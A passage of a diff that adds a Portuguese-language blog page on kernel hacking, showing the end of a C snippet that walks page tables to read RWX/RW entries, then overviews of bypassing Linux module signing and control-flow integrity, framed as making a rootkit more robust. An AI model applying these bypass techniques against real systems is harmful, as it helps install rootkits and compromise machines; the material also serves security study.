+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> rwx_pte = <span style="color:#447fcf">pageTableWalk</span>(pgd, <span style="color:#447fcf">find_synonym</span>(pgd,rwx));
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> rw_pte = <span style="color:#447fcf">pageTableWalk</span>(pgd, <span style="color:#447fcf">find_synonym</span>(pgd,rw));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;[*] RWX: %lx</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, <span style="color:#447fcf">read64</span>(rwx_pte));
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;[*] RW : %lx</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, <span style="color:#447fcf">read64</span>(rw_pte));
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<h3 id="4--assinaturas-módulo-de-kernels">
+  4- Assinaturas módulo de Kernels
+  <a class="heading-link" href="#4--assinaturas-m%c3%b3dulo-de-kernels">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h3>
+<p>A Assinatura de Módulos do Kernel (com SHA-512 como padrão) é um mecanismo de segurança integrado ao Linux que garante que apenas módulos do kernel (arquivos .ko) assinados digitalmente por uma chave confiável possam ser carregados. Esse recurso é essencial para evitar a injeção de código malicioso (como rootkits) ou módulos não autorizados no kernel, especialmente em sistemas com Secure Boot habilitado.</p>
+<p>As formas de bypass incluem:</p>
+<p><strong>Secure Boot Desabilitado</strong>: Módulos não assinados podem ser carregados via <code>insmod --force</code>
+<strong>Chaves Personalizadas</strong>: Sistemas podem usar chaves locais, mas isso exige recompilar o kernel.
+<strong>instalar um driver com falhas</strong> que podem ser explorados, basicamente a instalação de uma vulnerabilidade na máquina (ex: CVE-2021-3490).</p>
+<h3 id="5---integridade-de-fluxo-de-controle-cfi">
+  5-  Integridade de Fluxo de Controle (CFI)
+  <a class="heading-link" href="#5---integridade-de-fluxo-de-controle-cfi">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h3>
+<p>é um mecanismo de segurança que é configurado para proteger programas e sistemas contra explorações que descarrilam o fluxo de execução legítimo, como <strong>Programação Orientada a Retorno</strong> (ROP) e Programação Orientada a Salto (JOP). Ele garante que o fluxo de controle (chamadas de função, retornos, saltos) tome apenas caminhos predefinidos válidos, evitando assim que invasores sequestrem a execução para código malicioso. Para contornar esse sistema existem as seguintes tecnicas:</p>
+<ul>
+<li>
+<p>A. Type Confusion (Confusão de Tipos)
+<strong>Mecanismo</strong>: Enganar verificações de tipo do CFI usando objetos de tipos diferentes com assinaturas compatíveis.
+<strong>Exemplo</strong>: Substituir um ponteiro de função void (*)(int) por outro de tipo similar, mas com comportamento malicioso.
+<strong>Exemplo Real</strong>: CVE-2021-22555 (Linux Netfilter) explorou confusão de tipos para contornar CFI.</p>
+</li>
+<li>
+<p>B. Ataques a Implementações &ldquo;Coarse-Grained&rdquo;
+<strong>Problema</strong>: CFI &ldquo;coarse-grained&rdquo; agrupa muitos destinos válidos em categorias amplas.
+<strong>Exemplo</strong>: Se todas as funções que retornam int forem consideradas válidas, um atacante pode redirecionar para qualquer uma delas.
+Ferramentas Afetadas: Versões antigas do Clang CFI e Microsoft CFG.</p>
+</li>
+<li>
+<p>C. Memory Corruption Primitive + CFI Weakening
+<strong>Mecanismo</strong>: Combinar corrupção de memória (ex: buffer overflow) com falhas no CFI.
+<strong>Exemplo</strong>: Corromper uma estrutura de dados (ex: struct file_operations) para redirecionar fluxo para gadgets permitidos pelo CFI.
+<strong>Caso</strong>: WarpAttack usou double-fetches (acessos duplos à memória) para criar condições de corrida e burlar verificações.</p>
+</li>
+<li>
+<p>D. ROP/JOP Dentro de Limites Permitidos
+<strong>Mecanismo</strong>: Construir cadeias ROP/JOP usando apenas gadgets em regiões marcadas como válidas pelo CFI.
+<strong>Exemplo</strong>: Counterfeit Object-Oriented Programming (COOP) usa chamadas legítimas de objetos para atingir fins maliciosos.</p>
+</li>
+<li>
+<p>E. Abuso de APIs ou Funções Legítimas
+<strong>Mecanismo</strong>: Chamar funções válidas do sistema com argumentos manipulados.
+<strong>Exemplo</strong>: Usar system() ou execve() com parâmetros controlados pelo atacante.
+Desta forma podemos fazer nosso rootkit  ficar mais sofisticado e robusto.</p>
+</li>
+</ul>
+<h3 id="6-conclusão">
+  6-Conclusão
+  <a class="heading-link" href="#6-conclus%c3%a3o">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h3>
+<p>concluo esse artigo que o Kernel hacking é uma área extremamente grande, e que uma guerra constante na sostificação de defesas contra os atacantes, e o conteúdo mostrado se refere a algumas técnicas para contornar as defesas do Kernel Linux, portanto há inúmeras maneiras de se fazer isso. Então é isso muito obrigado!!!</p>
+<p><span style="color:red"><strong>lights on &amp; black0ut out</strong></span></p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css"
+    integrity="sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0" crossorigin="anonymous">
+  
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js"
+    integrity="sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js"
+    integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"
+    onload="renderMathInElement(document.body,
+      {
+        delimiters: [
+          {left: '$$', right: '$$', display:true},
+          {left: '$', right: '$', display:false},
+          {left: '\\(', right: '\\)', display: false},
+          {left: '\\[', right: '\\]', display: true}
+        ]
+      }
+    );"></script>
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2025
+     pwnbuffer 
+    ·
+    
+    Promovido por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder (modified)</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="https://pwnbuffer.org/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+  
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
